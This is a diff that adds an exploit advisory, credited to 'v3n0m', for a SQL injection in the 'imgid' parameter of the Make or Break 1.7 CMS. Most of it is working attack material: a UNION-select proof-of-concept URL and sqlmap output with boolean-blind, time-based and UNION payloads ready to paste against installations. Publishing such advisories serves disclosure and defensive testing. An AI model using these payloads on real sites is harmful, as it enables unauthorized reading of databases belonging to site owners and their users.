@@ -1,0 +1,42 @@
+# Exploit 	: Make or Break 1.7 (imgid) SQL Injection Vulnerability
+# Author	: v3n0m
+# Contact	: v3n0m[at]outlook[dot]com
+# Date		: January, 09-2017 GMT +7:00 Jakarta, Indonesia
+# Software	: Make or Break
+# Version	: 1.7 Lower versions may also be affected
+# License	: Free
+# Download	: http://software.friendsinwar.com/downloads.php?cat_id=2&file_id=9
+# Credits	: YOGYACARDERLINK, Dhea Fathin Karima & YOU !!
+
+1. Description
+
+An attacker can exploit this vulnerability to read from the database.
+The parameter 'imgid' is vulnerable.
+
+
+2. Proof of Concept
+
+http://domain.tld/[path]/index.php?imgid=-9999+union+all+select+null,null,null,null,version(),null--
+
+# Exploitation via SQLMap
+
+Parameter: imgid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: imgid=1 AND 4688=4688
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: imgid=1 OR SLEEP(2)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: imgid=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176786271,0x746264586d76465246657a5778446f756c6d696859494e7247735476506447726470676f4e544c59,0x71706b7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WQyQ
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+
+
+3. Security Risk
+
+The security risk of the remote sql-injection web vulnerability in the Make or Break CMS is estimated as high.
